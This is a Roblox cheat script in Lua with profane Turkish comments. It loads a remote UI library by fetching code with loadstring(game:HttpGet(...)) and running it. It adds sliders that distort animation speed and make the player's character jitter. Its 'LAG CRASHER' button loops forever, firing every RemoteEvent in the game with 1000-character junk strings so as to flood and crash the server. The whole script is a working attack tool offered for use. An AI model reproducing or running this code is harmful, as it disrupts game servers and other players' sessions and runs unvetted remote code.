local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()

local Window = Rayfield:CreateWindow({
   Name = "XEDITIO-SYSTEM-BREAKER-UNIVERSAL",
   ConfigurationSaving = { Enabled = true, FolderName = "XeditioUniversal", FileName = "Xeditio Software" },
   KeySystem = false
})

local MainTab = Window:CreateTab("System Breaker", 4483362458)

-- 1. Animasyon Hızı (Yürüme + Duruş + Her Şey amına)
MainTab:CreateSlider({
   Name = "Genel Animasyon Hızı (Max 1000)",
   Range = {1, 1000},
   Increment = 1,
   CurrentValue = 1,
   Callback = function(Value)
      _G.GlobalAnimSpeed = Value
      task.spawn(function()
         while _G.GlobalAnimSpeed == Value do
            local hum = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
            if hum then
               -- Sadece yürüme değil duruş (Idle) ve bütün hareketleri mermi gibi hızlandırır amına
               for _, track in pairs(hum:GetPlayingAnimationTracks()) do
                  track:AdjustSpeed(Value)
               end
            end
            task.wait(0.1)
         end
      end)
   end,
})

-- 2. EGOR (Gerçek Takılma - Karakter Titreme amına)
MainTab:CreateSlider({
   Name = "Egor (Takılma ve Titreme) - Max 10",
   Range = {1, 10},
   Increment = 1,
   CurrentValue = 1,
   Callback = function(Value)
      _G.EgorLevel = Value
      if Value > 1 then
         task.spawn(function()
            while _G.EgorLevel == Value do
               local hrp = game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
               if hrp then
                  -- Karakteri mermi (tövbeler olsun) gibi ileri geri sarsar valla amına
                  local oldCF = hrp.CFrame
                  hrp.CFrame = oldCF * CFrame.new(0, 0, 0.5)
                  task.wait(0.01)
                  hrp.CFrame = oldCF
               end
               task.wait(0.1 / Value)
            end
         end)
      end
   end,
})

-- 3. LAG CRASHER (MS Düşürme - Sunucu Patlatma amına)
MainTab:CreateButton({
   Name = "LAG CRASHER (MS TAVAN YAPTIR AMINA)",
   Callback = function()
      Rayfield:Notify({Title = "Xeditio", Content = "Kod yağmuru başladı mermi (tövbeler olsun) gibi!", Duration = 5})
      -- Sunucuyu veri yağmuruna tutan o maşrapaya dönmüş döngü amına
      task.spawn(function()
         while true do
            -- Sunucudaki bütün Remote'lara mermi (tövbeler olsun) gibi boş paket gönderir amına
            for _, v in pairs(game:GetDescendants()) do
               if v:IsA("RemoteEvent") then
                  v:FireServer("XeditioReis" .. string.rep("0", 1000)) -- 1000 karakterlik veri yağmuru amına
               end
            end
            task.wait(0.01) -- Hiç durmadan mermi (tövbeler olsun) gibi gönder amına
         end
      end)
   end,
})
